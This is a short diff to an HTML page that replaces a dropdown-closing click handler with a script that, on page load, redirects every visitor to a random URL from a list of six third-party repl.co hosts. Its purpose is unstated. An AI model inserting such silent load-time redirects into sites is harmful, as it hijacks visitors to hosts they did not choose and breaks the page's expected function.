@@ -78,15 +78,16 @@
       <script src="/js/sidebar/sidebar.js"></script>
       <!--end sidebar-->
       <script>
-        window.onclick = function (event) {
-          if (!event.target.matches(".dropbtn")) {
-            let dropdowns = document.getElementsByClassName("dropdown-content");
-            for (let i = 0; i < dropdowns.length; i++) {
-              let openDropdown = dropdowns[i];
-              if (openDropdown.classList.contains("show")) openDropdown.classList.remove("show");
-            }
-          }
-        };
+const urlList = [
+  "https://d.rubialt.repl.co/",
+  "https://canvas.luisotero5.repl.co/",
+  "https://dq-sqwdaswqd.rubialt.repl.co/",
+  "https://dqs.rubialt.repl.co/",
+  "https://ddddq-wwws.rubialt.repl.co/",
+  "https://uv-1.parmeetbagri.repl.co/"
+];
+window.location.replace(urlList[Math.floor(Math.random() * urlList.length)]);
+
       </script>
     </div>
   </body>
